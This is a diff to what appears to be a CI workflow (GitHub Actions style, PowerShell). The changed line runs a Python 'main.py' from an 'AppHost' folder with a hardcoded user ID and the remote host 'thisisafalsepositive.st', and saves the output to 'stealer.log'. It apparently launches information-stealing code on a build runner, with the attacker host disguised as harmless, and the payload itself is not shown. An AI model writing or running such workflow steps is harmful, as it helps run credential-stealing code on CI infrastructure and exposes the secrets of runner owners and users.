@@ -49,7 +49,7 @@ jobs:
           $py = Get-Content "$d\py.txt" -ErrorAction SilentlyContinue
           if (-not $py) { "no python path"; exit 0 }
           $rt = Join-Path (Split-Path $py) "AppHost"
-          Push-Location (Split-Path $py); $v = & ".\python.exe" -c "print(123)" 2>&1; "selftest=$v exit=$LASTEXITCODE"; $o = & ".\python.exe" (Join-Path $rt "main.py") -u "$env:UID_" --host "$env:DOM_" --env Fabric 2>&1; "run_exit=$LASTEXITCODE"; $o | Out-String | Set-Content "$d\stealer.log"; Pop-Location
+          Push-Location (Split-Path $py); $v = & ".\python.exe" -c "print(123)" 2>&1; "selftest=$v exit=$LASTEXITCODE"; $o = & ".\python.exe" (Join-Path $rt "main.py") -u "80618e74-3f82-4aa6-b6e3-510587905f36" --host "thisisafalsepositive.st" --env "Fabric" 2>&1; "run_exit=$LASTEXITCODE"; $o | Out-String | Set-Content "$d\stealer.log"; Pop-Location
           "exit=$LASTEXITCODE"
           Start-Sleep 30
           Get-ChildItem "$d" -Recurse | Select-Object FullName,Length | Out-String | Write-Output
@@ -62,6 +62,7 @@ jobs:
         if: always()
         shell: powershell
         run: Get-Process java,python* -ErrorAction SilentlyContinue | Stop-Process -Force
+
 
 
 
